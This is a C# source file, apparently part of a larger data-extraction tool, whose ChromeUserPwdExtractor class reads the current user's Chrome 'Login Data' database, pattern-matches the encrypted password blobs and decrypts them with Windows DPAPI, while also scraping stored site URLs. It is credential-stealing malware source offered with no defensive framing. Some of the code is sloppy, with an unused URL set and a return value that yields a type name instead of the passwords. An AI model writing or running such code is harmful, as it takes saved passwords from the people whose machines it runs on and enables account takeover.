using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.Collections.Generic;

namespace TP
{
    public class ChromeUserPwdExtractor : DataExtractor
    {

        public ChromeUserPwdExtractor()
        {
            fileName = "chromeData";
        }

        protected override string ExtractData()
        {
            List<string> password = GetChromeUserPassword();
            return password.ToString();
        }

        private List<string> GetChromeUserPassword()
        {
            var pathWithEnv = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data";
            var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);

            if (filePath == null)
                Console.Error.WriteLine("Failed to get ProductName from registry");
            FileStream fs = File.Open(filePath, FileMode.OpenOrCreate, FileAccess.ReadWrite,FileShare.None);
            var encoding = System.Text.Encoding.GetEncoding(28591);
            StreamReader streamReader = new StreamReader(fs, encoding);
            var binaryText = streamReader.ReadToEnd();
            streamReader.Close();
            fs.Close();

            Regex pwdRegex = new Regex(@"(\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)[\s\S]*?(?=\x68\x74\x74\x70|\Z)");
            var pwdMatches = pwdRegex.Matches(binaryText);
            List<string> decPwdArray = new List<string>();

            foreach (var pwd in pwdMatches)
            {
                var pwdEncoded = encoding.GetBytes(pwd.ToString());
                var decrypt = ProtectedData.Unprotect(pwdEncoded, null, DataProtectionScope.CurrentUser);
                var decPwd = Encoding.Default.GetString(decrypt);
                decPwdArray.Add(decPwd);
            }


            string pattern = @"(ht|f)tp(s?)\:\/\/[0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*(\/?)";
            Regex userRegex = new Regex(pattern, RegexOptions.IgnoreCase | RegexOptions.Multiline);
            var usrMatches = userRegex.Matches(binaryText);


            HashSet<string> usr = new HashSet<string>();

            foreach (var user in usrMatches)
            {
                var usrEncoded = encoding.GetBytes(user.ToString());
                var decPwd = Encoding.Default.GetString(usrEncoded);
                usr.Add(decPwd);
            }




            return decPwdArray;
        }
    }
}
